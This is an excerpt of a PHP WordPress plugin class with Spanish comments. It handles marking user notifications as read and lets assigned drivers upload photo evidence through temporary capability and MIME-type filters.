	 * Mark a notification as read.
	 *
	 * @param WP_REST_Request $request The request object.
	 * @return WP_REST_Response|WP_Error The response object.
	 */
	public function mark_notification_read($request) {
		global $wpdb;
		$notification_id = $request['id'];
		$user_id = get_current_user_id();

		// Verificar que la notificación pertenezca al usuario
		$table_name = $wpdb->prefix . 'united_motor_notifications';
		$owner_id = $wpdb->get_var( $wpdb->prepare( "SELECT user_id FROM $table_name WHERE id = %d", $notification_id ) );

		if ( ! $owner_id ) {
			return new WP_Error( 'rest_not_found', __( 'Notificación no encontrada.', 'united-motor' ), array( 'status' => 404 ) );
		}

		if ( (int)$owner_id !== $user_id && ! current_user_can( 'manage_options' ) ) {
			return new WP_Error( 'rest_forbidden', __( 'No tienes permiso para modificar esta notificación.', 'united-motor' ), array( 'status' => 403 ) );
		}

		$updated = United_Motor_Notifications::mark_as_read($notification_id);

		if ($updated === false) {
			return new WP_Error('rest_error', __('No se pudo marcar como leída.', 'united-motor'), array('status' => 500));
		}

		return new WP_REST_Response(
			array(
				'success' => true, 
				'message' => __('Notificación marcada como leída.', 'united-motor')
			), 
			200
		);
	}

	/**
	 * Activa filtros de subida para conductores/admins en el endpoint de evidencia.
	 *
	 * @param int $post_id ID de la solicitud.
	 */
	private function enable_driver_upload_filters($post_id)
	{
		$this->allowing_driver_upload = true;
		$this->upload_context_post_id = (int) $post_id;

		add_filter('user_has_cap', array($this, 'grant_upload_capability'), 10, 4);
		add_filter('map_meta_cap', array($this, 'map_driver_upload_caps'), 10, 4);
		add_filter('upload_mimes', array($this, 'allow_image_uploads'));
		add_filter('wp_check_filetype_and_ext', array($this, 'fix_upload_filetype'), 10, 4);
	}

	/**
	 * Desactiva filtros temporales de subida.
	 */
	private function disable_driver_upload_filters()
	{
		$this->allowing_driver_upload = false;
		$this->upload_context_post_id   = 0;

		remove_filter('user_has_cap', array($this, 'grant_upload_capability'), 10);
		remove_filter('map_meta_cap', array($this, 'map_driver_upload_caps'), 10);
		remove_filter('upload_mimes', array($this, 'allow_image_uploads'));
		remove_filter('wp_check_filetype_and_ext', array($this, 'fix_upload_filetype'), 10);
	}

	/**
	 * ID de solicitud en contexto de subida (para map_meta_cap).
	 *
	 * @var int
	 */
	private $upload_context_post_id = 0;

	/**
	 * Sube imagen de evidencia y crea el adjunto en la biblioteca de medios.
	 *
	 * @param int    $post_id ID de la solicitud.
	 * @param string $field   Nombre del campo en $_FILES.
	 * @return int|WP_Error
	 */
	private function upload_status_evidence_image($post_id, $field = 'foto')
	{
		if (empty($_FILES[ $field ]) || ! empty($_FILES[ $field ]['error'])) {
			return new WP_Error(
				'rest_upload_no_file',
				__('No se recibió la imagen o hubo un error en la subida.', 'united-motor'),
				array('status' => 400)
			);
		}

		$upload = wp_handle_upload(
			$_FILES[ $field ],
			array(
				'test_form' => false,
				'mimes'     => $this->get_allowed_upload_mimes(),
			)
		);

		if (isset($upload['error'])) {
			return new WP_Error(
				'rest_upload_error',
				$upload['error'],
				array('status' => 400)
			);
		}

		$filename = wp_basename($upload['file']);
		$attachment = array(
			'post_mime_type' => $upload['type'],
			'post_title'     => sanitize_file_name(pathinfo($filename, PATHINFO_FILENAME)),
			'post_content'   => '',
			'post_status'    => 'inherit',
			'post_author'    => get_current_user_id(),
		);

		$attach_id = wp_insert_attachment($attachment, $upload['file'], $post_id);
		if (is_wp_error($attach_id)) {
			return $attach_id;
		}

		$attach_data = wp_generate_attachment_metadata($attach_id, $upload['file']);
		wp_update_attachment_metadata($attach_id, $attach_data);

		return $attach_id;
	}

	/**
	 * MIME types permitidos para evidencias fotográficas.
	 *
	 * @return array
	 */
	private function get_allowed_upload_mimes()
	{
		return array(
			'jpg|jpeg|jpe' => 'image/jpeg',
			'png'          => 'image/png',
			'gif'          => 'image/gif',
			'webp'         => 'image/webp',
			'heic'         => 'image/heic',
			'heif'         => 'image/heif',
		);
	}

	/**
	 * Callback para permitir upload_files a conductores durante la subida API.
	 */
	public function grant_upload_capability($allcaps, $caps, $args, $user)
	{
		if (! $this->allowing_driver_upload) {
			return $allcaps;
		}

		if ((int) $user->ID !== get_current_user_id()) {
			return $allcaps;
		}

		$allcaps['upload_files'] = true;
		$allcaps['edit_posts']   = true;

		$check_cap = isset($args[0]) ? $args[0] : '';
		if ($check_cap === 'edit_post' && ! empty($args[1])) {
			$allcaps['edit_post'] = true;
		}

		return $allcaps;
	}

	/**
	 * Permite a conductores asignados adjuntar evidencia a su solicitud.
	 */
	public function map_driver_upload_caps($caps, $cap, $user_id, $args)
	{
		if (! $this->allowing_driver_upload || $cap !== 'edit_post' || empty($args[0])) {
			return $caps;
		}

		$post = get_post((int) $args[0]);
		if (! $post || $post->post_type !== 'solicitud_transporte') {
			return $caps;
		}

		$user = get_userdata($user_id);
		if (! $user) {
			return $caps;
		}

		if (user_can($user_id, 'manage_options') || in_array('administrator', (array) $user->roles, true)) {
			return array('exist');
		}

		if (in_array('driver', (array) $user->roles, true)) {
			$driver_id = get_post_meta($post->ID, '_assigned_driver_id', true);
			if ((int) $driver_id === (int) $user_id) {
				return array('exist');
			}
		}

		return $caps;
	}

	/**
	 * Corrige detección de tipo cuando el móvil envía MIME o extensión no estándar.
	 */
	public function fix_upload_filetype($data, $file, $filename, $mimes)
	{
		if (! empty($data['ext']) && ! empty($data['type'])) {
			return $data;
		}

		if (preg_match('/\.heic$/i', $filename)) {
			$data['ext']  = 'heic';
			$data['type'] = 'image/heic';
			return $data;
		}

		if (preg_match('/\.heif$/i', $filename)) {
			$data['ext']  = 'heif';
			$data['type'] = 'image/heif';
			return $data;
		}

		if (preg_match('/\.webp$/i', $filename)) {
			$data['ext']  = 'webp';
			$data['type'] = 'image/webp';
			return $data;
		}

		if (function_exists('getimagesize') && is_string($file) && file_exists($file)) {
			$image_info = @getimagesize($file);
			if ($image_info && isset($image_info[2])) {
				$map = array(
					IMAGETYPE_JPEG => array('jpg', 'image/jpeg'),
					IMAGETYPE_PNG  => array('png', 'image/png'),
					IMAGETYPE_GIF  => array('gif', 'image/gif'),
				);
				if (defined('IMAGETYPE_WEBP')) {
					$map[ IMAGETYPE_WEBP ] = array('webp', 'image/webp');
				}
				if (isset($map[ $image_info[2] ])) {
					$data['ext']  = $map[ $image_info[2] ][0];
					$data['type'] = $map[ $image_info[2] ][1];
				}
			}
		}

		return $data;
	}

	public function allow_image_uploads($mimes)
	{
		return array_merge((array) $mimes, $this->get_allowed_upload_mimes());
	}
}
